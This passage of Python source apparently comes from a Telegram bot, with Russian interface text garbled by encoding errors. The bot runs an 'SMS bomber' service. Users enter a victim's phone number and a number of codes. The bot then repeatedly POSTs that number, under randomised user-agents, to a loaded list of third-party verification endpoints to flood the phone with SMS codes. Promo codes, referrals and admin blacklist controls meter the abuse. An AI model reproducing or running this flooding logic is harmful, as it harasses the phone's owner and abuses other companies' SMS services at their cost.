        bot.set_state(message.from_user.id, BomberStates.ADD_BLACKLIST, message.chat.id)
    elif message.text == "üìì –ü—Ä–æ—Å–º–æ—Ç—Ä blacklist" and is_admin(message.from_user.id):
        list_blacklist(message)
    elif message.text == "üóë –£–¥–∞–ª–∏—Ç—å –∏–∑ blacklist" and is_admin(message.from_user.id):
        bot.reply_to(
            message,
            "üóë –í–≤–µ–¥–∏—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –∏–∑ —á–µ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫–∞:\n"
            "üí° –ü—Ä–∏–º–µ—Ä: 6457569474\n"
            "–î–ª—è –æ—Ç–º–µ–Ω—ã –Ω–∞–∂–º–∏ '‚ùå –û—Ç–º–µ–Ω–∞'",
            reply_markup=get_cancel_menu(),
            parse_mode='Markdown'
        )
        bot.set_state(message.from_user.id, BomberStates.REMOVE_BLACKLIST, message.chat.id)
    elif message.text == "‚ùå –û—Ç–º–µ–Ω–∞":
        cancel(message)
    else:
        current_state = bot.get_state(message.from_user.id, message.chat.id)
        state_str = str(current_state)
        if state_str == "BomberStates:PHONE":
            logger.info(f"Processing as phone number: {message.text}")
            number = message.text.strip()
            whitelist = load_whitelist()
            if number in whitelist:
                bot.reply_to(
                    message,
                    "üö´ –≠—Ç–æ—Ç –Ω–æ–º–µ—Ä –≤ –±–µ–ª–æ–º —Å–ø–∏—Å–∫–µ –∏ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω!",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
                return
            if not number.startswith('+'):
                bot.reply_to(
                    message,
                    "‚ùå –ù–æ–º–µ—Ä –¥–æ–ª–∂–µ–Ω –Ω–∞—á–∏–Ω–∞—Ç—å—Å—è —Å '+'!\n"
                    "–ü—Ä–∏–º–µ—Ä: +79123456789\n"
                    "–ü–æ–ø—Ä–æ–±—É–π –µ—â—ë —Ä–∞–∑:",
                    reply_markup=get_cancel_menu(),
                    parse_mode='Markdown'
                )
                return
            try:
                if not number[1:].replace(' ', '').isdigit():
                    bot.reply_to(
                        message,
                        "‚ùå –ù–æ–º–µ—Ä –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã –ø–æ—Å–ª–µ '+'!\n"
                        "–ü–æ–ø—Ä–æ–±—É–π –µ—â—ë —Ä–∞–∑:",
                        reply_markup=get_cancel_menu(),
                        parse_mode='Markdown'
                    )
                    return
                with bot.retrieve_data(message.from_user.id, message.chat.id) as data:
                    data['phone'] = number
                bot.set_state(message.from_user.id, BomberStates.CODES, message.chat.id)
                bot.reply_to(
                    message,
                    f"üì± –ù–æ–º–µ—Ä —Å–æ—Ö—Ä–∞–Ω—ë–Ω: **{number}**\n"
                    "üî¢ –°–∫–æ–ª—å–∫–æ –∫–æ–¥–æ–≤ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å? (–í–≤–µ–¥–∏ —á–∏—Å–ª–æ)\n"
                    "–î–ª—è –æ—Ç–º–µ–Ω—ã –Ω–∞–∂–º–∏ '‚ùå –û—Ç–º–µ–Ω–∞'",
                    reply_markup=get_cancel_menu(),
                    parse_mode='Markdown'
                )
            except Exception as e:
                bot.reply_to(
                    message,
                    "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –Ω–æ–º–µ—Ä–∞.\n"
                    "–ü–æ–ø—Ä–æ–±—É–π —Å–Ω–æ–≤–∞ –∏–ª–∏ –Ω–∞—á–Ω–∏ –∑–∞–Ω–æ–≤–æ.",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
        elif state_str == "BomberStates:CODES":
            logger.info(f"Processing as codes: {message.text}")
            try:
                codes = int(message.text.strip())
                user_id = str(message.from_user.id)
                users = load_users()
                if codes <= 0:
                    bot.reply_to(
                        message,
                        "‚ùå –ß–∏—Å–ª–æ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –±–æ–ª—å—à–µ 0! –í–≤–µ–¥–∏ —Å–Ω–æ–≤–∞:",
                        reply_markup=get_cancel_menu(),
                        parse_mode='Markdown'
                    )
                    return
                if user_id not in users or users[user_id]['codes'] < codes:
                    bot.reply_to(
                        message,
                        f"‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –∫–æ–¥–æ–≤!\n"
                        f"–£ —Ç–µ–±—è: **{users[user_id]['codes']} –∫–æ–¥–æ–≤**.\n"
                        "üéÅ –ê–∫—Ç–∏–≤–∏—Ä—É–π –ø—Ä–æ–º–æ–∫–æ–¥ –∏–ª–∏ –ø—Ä–∏–≥–ª–∞—à–∞–π –¥—Ä—É–∑–µ–π!",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                    bot.delete_state(message.from_user.id, message.chat.id)
                    return
                with bot.retrieve_data(message.from_user.id, message.chat.id) as data:
                    number = data.get('phone')
                if not number:
                    bot.reply_to(
                        message,
                        "‚ùå –û—à–∏–±–∫–∞: –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω.\n"
                        "–ù–∞—á–∞—Ç—å –∑–∞–Ω–æ–≤–æ.",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                    bot.delete_state(message.from_user.id, message.chat.id)
                    return
                endpoints = load_endpoints()
                if not endpoints:
                    bot.reply_to(
                        message,
                        "‚ùå –û—à–∏–±–∫–∞: –Ω–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å API —Å—Å—ã–ª–∫–∏.\n"
                        "–ü–æ–ø—Ä–æ–±—É–π –ø–æ–∑–∂–µ.",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                    bot.delete_state(message.from_user.id, message.chat.id)
                    return
                total_sent = 0
                user_agent = UserAgent()
                pass_count = 0
                max_passes = 10
                bot.reply_to(
                    message,
                    f"üöÄ –ù–∞—á–∏–Ω–∞—é –æ—Ç–ø—Ä–∞–≤–∫—É **{codes} –∫–æ–¥–æ–≤** –Ω–∞ –Ω–æ–º–µ—Ä **{number}**...\n"
                    f"‚è≥ –≠—Ç–æ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –Ω–µ–∫–æ—Ç–æ—Ä–æ–µ –≤—Ä–µ–º—è.",
                    parse_mode='Markdown'
                )
                while total_sent < codes and pass_count < max_passes:
                    pass_count += 1
                    try:
                        headers = {'user-agent': user_agent.random}
                        data = {'phone': number}
                        for endpoint in endpoints:
                            if total_sent >= codes:
                                break
                            try:
                                response = requests.post(endpoint, headers=headers, data=data, timeout=15)
                                if response.status_code == 200:
                                    total_sent += 1
                                    logger.info(f"Code {total_sent}/{codes} sent to {endpoint}")
                                else:
                                    logger.warning(f"Request to {endpoint} returned status code: {response.status_code}")
                                time.sleep(1)
                            except requests.exceptions.RequestException as e:
                                logger.warning(f"Request failed for endpoint {endpoint}: {str(e)}")
                                continue
                        bot.reply_to(
                            message,
                            f"‚è≥ –ü—Ä–æ—Ö–æ–¥ {pass_count}: –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ **{total_sent}/{codes}**\n"
                            f"{get_progress_bar(total_sent, codes)} {total_sent/codes*100:.1f}%",
                            parse_mode='Markdown'
                        )
                        if total_sent < codes:
                            time.sleep(5)
                    except Exception as e:
                        bot.reply_to(
                            message,
                            f"‚ùå –û—à–∏–±–∫–∞ –≤ –ø—Ä–æ—Ö–æ–¥–µ {pass_count}: {str(e)}",
                            parse_mode='Markdown'
                        )
                        logger.error(f"Error in pass {pass_count}: {str(e)}")
                        continue
                users[user_id]['codes'] -= total_sent
                users[user_id]['sent_codes'] += total_sent
                save_users(users)
                failed_to_send = codes - total_sent
                if failed_to_send > 0:
                    bot.reply_to(
                        message,
                        f"‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å **{failed_to_send} –∫–æ–¥–æ–≤**.\n"
                        f"–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ **{total_sent}** –∏–∑ **{codes}**.",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                else:
                    bot.reply_to(
                        message,
                        f"üéâ –ì–æ—Ç–æ–≤–æ! –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ **{codes} –∫–æ–¥–æ–≤** –Ω–∞ –Ω–æ–º–µ—Ä **{number}**!",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                bot.delete_state(message.from_user.id, message.chat.id)
            except ValueError:
                bot.reply_to(
                    message,
                    "‚ùå –í–≤–µ–¥–∏ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ!\n"
                    "–ü—Ä–∏–º–µ—Ä: 5\n"
                    "–ü–æ–ø—Ä–æ–±—É–π —Å–Ω–æ–≤–∞:",
                    reply_markup=get_cancel_menu(),
                    parse_mode='Markdown'
                )
            except Exception as e:
                bot.reply_to(
                    message,
                    f"‚ùå –û—à–∏–±–∫–∞: {str(e)}\n"
                    "–ü–æ–ø—Ä–æ–±—É–π —Å–Ω–æ–≤–∞ –∏–ª–∏ –Ω–∞—á–Ω–∏ –∑–∞–Ω–æ–≤–æ.",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
        elif state_str == "BomberStates:PROMO_ACTIVATION":
            promo_name = message.text.strip()
            users = load_users()
            user_id = str(message.from_user.id)
            try:
                promos = load_promos()
                if user_id not in users:
                    users[user_id] = {
                        'codes': 0,
                        'sent_codes': 0,
                        'activated_promos': 0,
                        'name': message.from_user.first_name,
                        'username': message.from_user.username or 'None',
                        'referrals': [],
                        'referrer_id': None
                    }
                if promo_name not in promos:
                    bot.reply_to(
                        message,
                        "‚ùå –¢–∞–∫–æ–π –ø—Ä–æ–º–æ–∫–æ–¥ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!\n"
                        "–ü—Ä–æ–≤–µ—Ä—å –Ω–∞–∑–≤–∞–Ω–∏–µ –∏ –ø–æ–ø—Ä–æ–±—É–π —Å–Ω–æ–≤–∞.",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                    bot.delete_state(message.from_user.id, message.chat.id)
                    return
                promo = promos[promo_name]
                if user_id in promo['users']:
                    bot.reply_to(
                        message,
                        "‚ùå –í—ã —É–∂–µ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–ª–∏ —ç—Ç–æ—Ç –ø—Ä–æ–º–æ–∫–æ–¥!",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                    bot.delete_state(message.from_user.id, message.chat.id)
                    return
                if promo['activations'] >= promo['max_activations']:
                    bot.reply_to(
                        message,
                        "‚ùå –≠—Ç–æ—Ç –ø—Ä–æ–º–æ–∫–æ–¥ –∏—Å—á–µ—Ä–ø–∞–ª –ª–∏–º–∏—Ç –∞–∫—Ç–∏–≤–∞—Ü–∏–π!",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                    bot.delete_state(message.from_user.id, message.chat.id)
                    return
                promo['activations'] += 1
                promo['users'].append(user_id)
                users[user_id]['codes'] += promo['reward']
                users[user_id]['activated_promos'] += 1
                save_promos(promos)
                save_users(users)
                bot.reply_to(
                    message,
                    f"üéâ –ü—Ä–æ–º–æ–∫–æ–¥ **{promo_name}** –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω!\n"
                    f"–í–∞–º –Ω–∞—á–∏—Å–ª–µ–Ω–æ **{promo['reward']} –∫–æ–¥–æ–≤**! üöÄ",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
            except Exception as e:
                bot.reply_to(
                    message,
                    f"‚ùå –û—à–∏–±–∫–∞: {str(e)}",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
        elif state_str == "BomberStates:CREATE_PROMO_NAME":
            promo_name = message.text.strip()
            with bot.retrieve_data(message.from_user.id, message.chat.id) as data:
                data['promo_name'] = promo_name
            bot.reply_to(
                message,
                "üéü –í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∫–æ–¥–æ–≤ –¥–ª—è –Ω–∞–≥—Ä–∞–¥—ã:\n"
                "üí° –ü—Ä–∏–º–µ—Ä: 5\n"
                "–î–ª—è –æ—Ç–º–µ–Ω—ã –Ω–∞–∂–º–∏ '‚ùå –û—Ç–º–µ–Ω–∞'",
                reply_markup=get_cancel_menu(),
                parse_mode='Markdown'
            )
            bot.set_state(message.from_user.id, BomberStates.CREATE_PROMO_REWARD, message.chat.id)
        elif state_str == "BomberStates:CREATE_PROMO_REWARD":
            try:
                reward = int(message.text.strip())
                if reward <= 0:
                    bot.reply_to(
                        message,
                        "‚ùå –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –∫–æ–¥–æ–≤ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –±–æ–ª—å—à–µ 0! –í–≤–µ–¥–∏ —Å–Ω–æ–≤–∞:",
                        reply_markup=get_cancel_menu(),
                        parse_mode='Markdown'
                    )
                    return
                with bot.retrieve_data(message.from_user.id, message.chat.id) as data:
                    data['reward'] = reward
                bot.reply_to(
                    message,
                    "üî¢ –í–≤–µ–¥–∏—Ç–µ –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∞–∫—Ç–∏–≤–∞—Ü–∏–π:\n"
                    "üí° –ü—Ä–∏–º–µ—Ä: 100\n"
                    "–î–ª—è –æ—Ç–º–µ–Ω—ã –Ω–∞–∂–º–∏ '‚ùå –û—Ç–º–µ–Ω–∞'",
                    reply_markup=get_cancel_menu(),
                    parse_mode='Markdown'
                )
                bot.set_state(message.from_user.id, BomberStates.CREATE_PROMO_ACTIVATIONS, message.chat.id)
            except ValueError:
                bot.reply_to(
                    message,
                    "‚ùå –í–≤–µ–¥–∏ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ!\n"
                    "–ü—Ä–∏–º–µ—Ä: 5\n"
                    "–ü–æ–ø—Ä–æ–±—É–π —Å–Ω–æ–≤–∞:",
                    reply_markup=get_cancel_menu(),
                    parse_mode='Markdown'
                )
        elif state_str == "BomberStates:CREATE_PROMO_ACTIVATIONS":
            try:
                max_activations = int(message.text.strip())
                if max_activations <= 0:
                    bot.reply_to(
                        message,
                        "‚ùå –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –∞–∫—Ç–∏–≤–∞—Ü–∏–π –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –±–æ–ª—å—à–µ 0! –í–≤–µ–¥–∏ —Å–Ω–æ–≤–∞:",
                        reply_markup=get_cancel_menu(),
                        parse_mode='Markdown'
                    )
                    return
                with bot.retrieve_data(message.from_user.id, message.chat.id) as data:
                    promo_name = data.get('promo_name')
                    reward = data.get('reward')
                promos = load_promos()
                if promo_name in promos:
                    bot.reply_to(
                        message,
                        "‚ùå –ü—Ä–æ–º–æ–∫–æ–¥ —Å —Ç–∞–∫–∏–º –Ω–∞–∑–≤–∞–Ω–∏–µ–º —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                    bot.delete_state(message.from_user.id, message.chat.id)
                    return
                promos[promo_name] = {
                    'reward': reward,
                    'max_activations': max_activations,
                    'activations': 0,
                    'users': []
                }
                save_promos(promos)
                bot.reply_to(
                    message,
                    f"üéâ –ü—Ä–æ–º–æ–∫–æ–¥ **{promo_name}** —Å–æ–∑–¥–∞–Ω!\n"
                    f"–ù–∞–≥—Ä–∞–¥–∞: **{reward} –∫–æ–¥–æ–≤**\n"
                    f"–ú–∞–∫—Å. –∞–∫—Ç–∏–≤–∞—Ü–∏–π: **{max_activations}**",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
            except ValueError:
                bot.reply_to(
                    message,
                    "‚ùå –í–≤–µ–¥–∏ —Ü–µ–ª–æ–µ —á–∏—Å–ª–æ!\n"
                    "–ü—Ä–∏–º–µ—Ä: 100\n"
                    "–ü–æ–ø—Ä–æ–±—É–π —Å–Ω–æ–≤–∞:",
                    reply_markup=get_cancel_menu(),
                    parse_mode='Markdown'
                )
            except Exception as e:
                bot.reply_to(
                    message,
                    f"‚ùå –û—à–∏–±–∫–∞: {str(e)}",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
        elif state_str == "BomberStates:ADD_WHITELIST":
            number = message.text.strip()
            if not number.startswith('+'):
                bot.reply_to(
                    message,
                    "‚ùå –ù–æ–º–µ—Ä –¥–æ–ª–∂–µ–Ω –Ω–∞—á–∏–Ω–∞—Ç—å—Å—è —Å '+'!\n"
                    "–ü—Ä–∏–º–µ—Ä: +79123456789\n"
                    "–ü–æ–ø—Ä–æ–±—É–π –µ—â—ë —Ä–∞–∑:",
                    reply_markup=get_cancel_menu(),
                    parse_mode='Markdown'
                )
                return
            try:
                if not number[1:].replace(' ', '').isdigit():
                    bot.reply_to(
                        message,
                        "‚ùå –ù–æ–º–µ—Ä –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã –ø–æ—Å–ª–µ '+'!\n"
                        "–ü–æ–ø—Ä–æ–±—É–π –µ—â—ë —Ä–∞–∑:",
                        reply_markup=get_cancel_menu(),
                        parse_mode='Markdown'
                    )
                    return
                whitelist = load_whitelist()
                if number not in whitelist:
                    whitelist.append(number)
                    save_whitelist(whitelist)
                    bot.reply_to(
                        message,
                        f"‚úÖ –ù–æ–º–µ—Ä **{number}** –¥–æ–±–∞–≤–ª–µ–Ω –≤ –±–µ–ª—ã–π —Å–ø–∏—Å–æ–∫.",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                else:
                    bot.reply_to(
                        message,
                        f"‚ÑπÔ∏è –ù–æ–º–µ—Ä **{number}** —É–∂–µ –≤ –±–µ–ª–æ–º —Å–ø–∏—Å–∫–µ!",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                bot.delete_state(message.from_user.id, message.chat.id)
            except Exception as e:
                bot.reply_to(
                    message,
                    f"‚ùå –û—à–∏–±–∫–∞: {str(e)}",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
        elif state_str == "BomberStates:REMOVE_WHITELIST":
            number = message.text.strip()
            if not number.startswith('+'):
                bot.reply_to(
                    message,
                    "‚ùå –ù–æ–º–µ—Ä –¥–æ–ª–∂–µ–Ω –Ω–∞—á–∏–Ω–∞—Ç—å—Å—è —Å '+'!\n"
                    "–ü—Ä–∏–º–µ—Ä: +79123456789\n"
                    "–ü–æ–ø—Ä–æ–±—É–π –µ—â—ë —Ä–∞–∑:",
                    reply_markup=get_cancel_menu(),
                    parse_mode='Markdown'
                )
                return
            try:
                if not number[1:].replace(' ', '').isdigit():
                    bot.reply_to(
                        message,
                        "‚ùå –ù–æ–º–µ—Ä –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã –ø–æ—Å–ª–µ '+'!\n"
                        "–ü–æ–ø—Ä–æ–±—É–π –µ—â—ë —Ä–∞–∑:",
                        reply_markup=get_cancel_menu(),
                        parse_mode='Markdown'
                    )
                    return
                whitelist = load_whitelist()
                if number in whitelist:
                    whitelist.remove(number)
                    save_whitelist(whitelist)
                    bot.reply_to(
                        message,
                        f"‚úÖ –ù–æ–º–µ—Ä **{number}** —É–¥–∞–ª—ë–Ω –∏–∑ –±–µ–ª–æ–≥–æ —Å–ø–∏—Å–∫–∞.",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                else:
                    bot.reply_to(
                        message,
                        f"‚ÑπÔ∏è –ù–æ–º–µ—Ä **{number}** –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –±–µ–ª–æ–º —Å–ø–∏—Å–∫–µ!",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                bot.delete_state(message.from_user.id, message.chat.id)
            except Exception as e:
                bot.reply_to(
                    message,
                    f"‚ùå –û—à–∏–±–∫–∞: {str(e)}",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
        elif state_str == "BomberStates:ADD_BLACKLIST":
            user_id_input = message.text.strip()
            try:
                if not user_id_input.isdigit():
                    bot.reply_to(
                        message,
                        "‚ùå ID –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã!\n"
                        "–ü—Ä–∏–º–µ—Ä: 6457569474\n"
                        "–ü–æ–ø—Ä–æ–±—É–π –µ—â—ë —Ä–∞–∑:",
                        reply_markup=get_cancel_menu(),
                        parse_mode='Markdown'
                    )
                    return
                blacklist = load_blacklist()
                if user_id_input not in blacklist:
                    blacklist.append(user_id_input)
                    save_blacklist(blacklist)
                    bot.reply_to(
                        message,
                        f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å **{user_id_input}** –¥–æ–±–∞–≤–ª–µ–Ω –≤ —á–µ—Ä–Ω—ã–π —Å–ø–∏—Å–æ–∫.",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                else:
                    bot.reply_to(
                        message,
                        f"‚ÑπÔ∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å **{user_id_input}** —É–∂–µ –≤ —á–µ—Ä–Ω–æ–º —Å–ø–∏—Å–∫–µ!",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                bot.delete_state(message.from_user.id, message.chat.id)
            except Exception as e:
                bot.reply_to(
                    message,
                    f"‚ùå –û—à–∏–±–∫–∞: {str(e)}",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
        elif state_str == "BomberStates:REMOVE_BLACKLIST":
            user_id_input = message.text.strip()
            try:
                if not user_id_input.isdigit():
                    bot.reply_to(
                        message,
                        "‚ùå ID –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã!\n"
                        "–ü—Ä–∏–º–µ—Ä:   148866688\n"
                        "–ü–æ–ø—Ä–æ–±—É–π –µ—â—ë —Ä–∞–∑:",
                        reply_markup=get_cancel_menu(),
                        parse_mode='Markdown'
                    )
                    return
                blacklist = load_blacklist()
                if user_id_input in blacklist:
                    blacklist.remove(user_id_input)
                    save_blacklist(blacklist)
                    bot.reply_to(
                        message,
                        f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å **{user_id_input}** —É–¥–∞–ª—ë–Ω –∏–∑ —á–µ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫–∞.",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                else:
                    bot.reply_to(
                        message,
                        f"‚ÑπÔ∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å **{user_id_input}** –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ —á–µ—Ä–Ω–æ–º —Å–ø–∏—Å–∫–µ!",
                        reply_markup=markup,
                        parse_mode='Markdown'
                    )
                bot.delete_state(message.from_user.id, message.chat.id)
            except Exception as e:
                bot.reply_to(
                    message,
                    f"‚ùå –û—à–∏–±–∫–∞: {str(e)}",
                    reply_markup=markup,
                    parse_mode='Markdown'
                )
                bot.delete_state(message.from_user.id, message.chat.id)
        else:
            bot.reply_to(
                message,
                "‚ÑπÔ∏è –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –∏—Å–ø–æ–ª—å–∑—É–π –∫–Ω–æ–ø–∫–∏ –Ω–∏–∂–µ:",
                reply_markup=markup,
                parse_mode='Markdown'
            )

@bot.message_handler(commands=['cancel'])
def cancel(message):
    logger.info(f"Received /cancel from user {message.from_user.id}")
    markup = get_admin_menu() if is_admin(message.from_user.id) else get_main_menu()
    bot.reply_to(
        message,
        "‚úÖ –î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ.\n"
        "–í—ã–±–µ—Ä–∏, —á—Ç–æ —Ö–æ—á–µ—à—å —Å–¥–µ–ª–∞—Ç—å:",
        reply_markup=markup,
        parse_mode='Markdown'
    )
    bot.delete_state(message.from_user.id, message.chat.id)

if __name__ == '__main__':
    logger.info("Starting bot polling")
    init_storage()
    while True:
        try:
            bot.infinity_polling()
        except Exception as e:
            logger.error(f"Polling error: {str(e)}")
            time.sleep(5)